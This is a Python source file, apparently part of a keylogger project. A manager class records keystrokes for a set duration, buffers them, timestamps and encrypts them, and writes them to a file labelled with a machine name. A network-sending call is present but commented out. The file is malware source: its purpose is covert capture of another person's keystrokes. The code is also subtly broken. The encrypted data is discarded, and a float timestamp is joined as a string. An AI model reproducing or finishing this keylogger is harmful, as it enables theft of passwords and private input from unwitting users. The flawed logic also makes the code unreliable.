from keyLoggerService import *
from fileWriter import *
from networkWriter import *
from buffer import *
from encryptor import *

class KeyLoggerManager:
    __service = KeyLoggerService()
    __filewriter = FileWriter()
    __networkwriter = NetworkWriter()

    def __init__(self, buffer_size: int, machine_name: str):
        self.__buffer = Buffer(buffer_size)
        self.__machine_name = machine_name

    def collect_data(self, duration: int) -> None:
        self.__service.start_logging()
        time.sleep(duration)
        self.__service.stop_logging()
        self.__buffer.add_data(self.__service.get_logged_keys())

    def process_data(self):
        data = self.__buffer.get_data()
        # add to the data a time stamp
        data.append(time.time())
        # encrypt the data after converting it to a string
        data = ''.join(data)
        Encryptor().encrypt(data)


    def send_data(self):
        data = self.__buffer.get_data()
        machine_name = self.__machine_name
        self.__filewriter.send_data(data, machine_name)
        #self.__networkwriter.send_data(data, machine_name)


manager = KeyLoggerManager(200, "machine1")
manager.collect_data(10)
manager.process_data()
manager.send_data()
